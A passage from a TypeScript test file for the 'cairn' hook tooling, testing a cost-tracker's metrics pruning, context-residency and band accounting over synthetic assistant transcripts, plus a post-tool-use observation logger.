    const transcript = transcriptWith(proj);
    const { dir, stem } = segmentDir(proj);
    mkdirSync(dir, { recursive: true });
    const day = 24 * 60 * 60 * 1000;
    const stale = new Date(Date.now() - 200 * day).toISOString();  // past the 90d window
    const fresh = new Date().toISOString();

    // droppable: "dead" is quiescent, "moved" is superseded by the live segment
    writeFileSync(join(dir, `${stem}.20250101-000000-00.jsonl`), rows(
      { ts: stale, session_id: "dead", phase: 1, est_cost_usd: 1 },
      { ts: stale, session_id: "moved", phase: 1, est_cost_usd: 1 },
    ));
    // kept: "alive" is neither -- one live session holds the whole segment
    writeFileSync(join(dir, `${stem}.20250102-000000-00.jsonl`), rows(
      { ts: stale, session_id: "old-friend", phase: 1, est_cost_usd: 1 },
      { ts: fresh, session_id: "alive", phase: 1, est_cost_usd: 1 },
    ));
    // live segment at the threshold, carrying "moved"'s newer row
    const metrics = metricsPathFor(proj);
    const bulk: string[] = [
      JSON.stringify({ ts: fresh, session_id: "moved", phase: 1, est_cost_usd: 2 }),
    ];
    for (let i = 0; i < 4999; i++) {
      bulk.push(JSON.stringify({ ts: fresh, session_id: `bulk-${i}`, phase: 1, est_cost_usd: 0 }));
    }
    writeFileSync(metrics, bulk.join("\n") + "\n");
    const aged = new Date(Date.now() - 120_000);
    utimesSync(metrics, aged, aged);

    expect(runHookRaw(COSTTRACKER, proj,
      JSON.stringify({ session_id: "s-prune", transcript_path: transcript })).status).toBe(0);

    const closed = closedSegments(proj);
    expect(closed).not.toContain(`${stem}.20250101-000000-00.jsonl`);
    expect(closed).toContain(`${stem}.20250102-000000-00.jsonl`);
    // the roll-over's own segment is brand new -- it is never a prune candidate
    expect(closed).toHaveLength(2);
    clearMetrics(proj);
  });

  it("stays a cheap recorder on a transcript full of fan-out (#176)", () => {
    const proj = freshDir("cairn-cost-perf-");
    const transcript = transcriptWithReports(proj);
    const metrics = metricsPathFor(proj);
    const payload = JSON.stringify({ session_id: "s-perf", transcript_path: transcript });
    const marginal = marginalHookMs(
      () => runHookRaw(COSTTRACKER, proj, payload),
      () => rmSync(metrics, { force: true }),
    );
    expect(marginal).toBeLessThan(MARGINAL_BUDGET_MS);
    rmSync(metrics, { force: true });
  });

  it("writes a live meter state file naming the current band", () => {
    const proj = freshDir("cairn-meter-");
    const home = freshDir("cairn-meter-home-");
    const transcript = join(proj, "t.jsonl");
    const turn = (cacheRead: number, cacheWrite: number) => JSON.stringify({
      type: "assistant",
      message: {
        model: "claude-opus-5",
        usage: { input_tokens: 0, output_tokens: 5,
          cache_read_input_tokens: cacheRead, cache_creation_input_tokens: cacheWrite },
        content: [{ type: "text", text: "ok" }],
      },
    });
    writeFileSync(transcript, [turn(0, 80_000), turn(420_000, 0)].join("\n") + "\n");

    runHook(COSTTRACKER, proj, home, { CLAUDE_PROJECT_DIR: proj },
      JSON.stringify({ transcript_path: transcript, session_id: "s-meter" }));

    const { base, hash } = hashAndBaseForEnvDir(proj);
    const meter = JSON.parse(readFileSync(
      join(home, ".cairn", "state", `${base}-${hash}-meter.json`), "utf8"));

    expect(meter.session_id).toBe("s-meter");
    expect(meter.turns).toBe(2);
    expect(meter.ctx_last).toBe(420_000);
    expect(meter.band).toBe("to500k");
    expect(meter.prefix_tokens).toBe(80_000);
    expect(meter.transcript_path).toBe(transcript);
  });

  it("records residency, bands and prefix alongside the cost totals", () => {
    const proj = freshDir("cairn-resid-");
    const home = freshDir("cairn-resid-home-");
    const transcript = join(proj, "t.jsonl");

    // Three assistant turns. Contexts: 100k, 200k, 400k -> one turn in each of
    // the first three bands. A 40k tool_result lands on turn 1, so it is
    // resident for the two turns that follow: residency 40000 * 2 = 80000.
    const turn = (cacheRead: number, cacheWrite: number, extra: object = {}) => JSON.stringify({
      type: "assistant",
      message: {
        model: "claude-opus-5",
        usage: { input_tokens: 0, output_tokens: 10,
          cache_read_input_tokens: cacheRead, cache_creation_input_tokens: cacheWrite },
        content: [{ type: "text", text: "ok" }],
      },
      ...extra,
    });
    const result = JSON.stringify({
      type: "user",
      message: { content: [{ type: "tool_result", tool_use_id: "t1", content: "x".repeat(160_000) }] },
    });

    writeFileSync(transcript, [
      turn(0, 100_000),        // turn 1, ctx 100k
      result,                  // 160k chars / 4 = 40k tokens, entering at turn 1
      turn(200_000, 0),        // turn 2, ctx 200k
      turn(400_000, 0),        // turn 3, ctx 400k
    ].join("\n") + "\n");

    runHook(COSTTRACKER, proj, home, {
      CLAUDE_PROJECT_DIR: proj,
    }, JSON.stringify({ transcript_path: transcript, session_id: "s-resid" }));

    const metricsDir = join(home, ".cairn", "metrics");
    const file = join(metricsDir, readdirSync(metricsDir)[0]);
    const row = JSON.parse(readFileSync(file, "utf8").trim().split("\n").pop()!);

    expect(row.context.turns).toBe(3);
    expect(row.context.turns_sidechain).toBe(0);
    expect(row.context.ctx_sum).toBe(700_000);
    expect(row.context.prefix_tokens).toBe(100_000);
    expect(row.context.bands).toEqual({ under150k: 1, to300k: 1, to500k: 1, over500k: 0 });
    expect(row.context.residency.tool_result).toBe(80_000);
    // Counts alone cannot carry a rent share -- a high-band turn costs far
    // more than a low-band one. The summed context per band rides alongside.
    expect(row.context.band_tokens)
      .toEqual({ under150k: 100_000, to300k: 200_000, to500k: 400_000, over500k: 0 });
  });

  it("counts user prose that arrives as a bare string, not a block array", () => {
    const proj = freshDir("cairn-strcontent-");
    const home = freshDir("cairn-strcontent-home-");
    const transcript = join(proj, "t.jsonl");

    // Most real user turns look like this on disk: message.content is a
    // STRING. Reading only the array shape undercounted user_text by ~93%.
    // 8000 chars / 4 = 2000 tokens, entering at turn 1, resident for the two
    // turns that follow -> 2000 * 2 = 4000 token-turns.
    const turn = (cacheRead: number) => JSON.stringify({
      type: "assistant",
      message: {
        model: "claude-opus-5",
        usage: { input_tokens: 0, output_tokens: 10,
          cache_read_input_tokens: cacheRead, cache_creation_input_tokens: 0 },
        content: [{ type: "text", text: "ok" }],
      },
    });
    const stringTurn = JSON.stringify({
      type: "user",
      message: { role: "user", content: "p".repeat(8_000) },
    });

    writeFileSync(transcript, [
      turn(100_000),   // turn 1
      stringTurn,      // string-shaped user prose, entering at turn 1
      turn(100_000),   // turn 2
      turn(100_000),   // turn 3
    ].join("\n") + "\n");

    runHook(COSTTRACKER, proj, home, {
      CLAUDE_PROJECT_DIR: proj,
    }, JSON.stringify({ transcript_path: transcript, session_id: "s-strcontent" }));

    const metricsDir = join(home, ".cairn", "metrics");
    const file = join(metricsDir, readdirSync(metricsDir)[0]);
    const row = JSON.parse(readFileSync(file, "utf8").trim().split("\n").pop()!);

    expect(row.context.residency.user_text).toBe(4_000);
  });

  it("attributes an assistant's own tool_use to the turn it was produced on, not the one before", () => {
    const proj = freshDir("cairn-resid-self-");
    const home = freshDir("cairn-resid-self-home-");
    const transcript = join(proj, "t.jsonl");

    // JSON.stringify({ d: "y".repeat(4000) }) is 4008 chars -> round(4008/4)
    // = 1002 tokens. It sits in turn 1's OWN tool_use block, not a later
    // user tool_result -- the case the other test doesn't cover, because a
    // user entry's turn count was already correct even before the counter
    // was hoisted above the producer block.
    const bigInput = { d: "y".repeat(4000) };
    const turnWithToolUse = (cacheRead: number, cacheWrite: number) => JSON.stringify({
      type: "assistant",
      message: {
        model: "claude-opus-5",
        usage: { input_tokens: 0, output_tokens: 10,
          cache_read_input_tokens: cacheRead, cache_creation_input_tokens: cacheWrite },
        content: [{ type: "tool_use", id: "tu1", name: "Read", input: bigInput }],
      },
    });
    const plainTurn = (cacheRead: number, cacheWrite: number) => JSON.stringify({
      type: "assistant",
      message: {
        model: "claude-opus-5",
        usage: { input_tokens: 0, output_tokens: 10,
          cache_read_input_tokens: cacheRead, cache_creation_input_tokens: cacheWrite },
        content: [{ type: "text", text: "ok" }],
      },
    });

    writeFileSync(transcript, [
      turnWithToolUse(0, 50_000),  // turn 1 -- the tool_use is measured HERE
      plainTurn(100_000, 0),       // turn 2
      plainTurn(150_000, 0),       // turn 3
    ].join("\n") + "\n");

    runHook(COSTTRACKER, proj, home, {
      CLAUDE_PROJECT_DIR: proj,
    }, JSON.stringify({ transcript_path: transcript, session_id: "s-resid-self" }));

    const metricsDir = join(home, ".cairn", "metrics");
    const file = join(metricsDir, readdirSync(metricsDir)[0]);
    const row = JSON.parse(readFileSync(file, "utf8").trim().split("\n").pop()!);

    // N=3 total turns, the tool_use entered at turn 1:
    //   3 * 1002 - 1002 * 1 = 2004.
    // Before the turn-counter hoist, the producer block ran ahead of
    // `totals.turns += 1` inside the assistant branch, so this same turn
    // read as turn 0 and residency came out to 3 * 1002 - 1002 * 0 = 3006 --
    // one turn's worth of inflation, and only on the assistant side.
    expect(row.context.residency.tool_call).toBe(2004);
  });
});

describe("posttooluse-observe", () => {
  const OBSERVE = join(scriptsDir, "posttooluse-observe.mjs");

  it("appends an observation row in a cairn project; errors flagged", () => {
    const proj = freshDir("cairn-obs-");
    mkdirSync(join(proj, ".cairn"), { recursive: true });
    const ok = runHookRaw(OBSERVE, proj, JSON.stringify({
      session_id: "s1", tool_name: "Edit",
      tool_input: { file_path: join(proj, "a.ts") },
      tool_response: {},
    }));
    expect(ok.status).toBe(0);
    const fail = runHookRaw(OBSERVE, proj, JSON.stringify({
      session_id: "s1", tool_name: "Bash",
      tool_input: { command: "npm test -- --watch" },
      tool_response: { exit_code: 1 },
    }));
    expect(fail.status).toBe(0);
    const rows = readFileSync(join(proj, ".cairn", "observations", "observations.jsonl"), "utf8")
      .trim().split("\n").map((l) => JSON.parse(l));
    expect(rows).toHaveLength(2);
    expect(rows[0]).toMatchObject({ tool: "Edit", error: false });
    expect(rows[1]).toMatchObject({ tool: "Bash", error: true });
    expect(rows[1].target).toContain("npm test");
  });

  it("is a no-op outside cairn-initialized projects", () => {
    const proj = freshDir("cairn-obs-");
    const r = runHookRaw(OBSERVE, proj, JSON.stringify({
      session_id: "s1", tool_name: "Edit", tool_input: { file_path: "x" }, tool_response: {},
    }));
    expect(r.status).toBe(0);
    expect(existsSync(join(proj, ".cairn"))).toBe(false);
  });
});
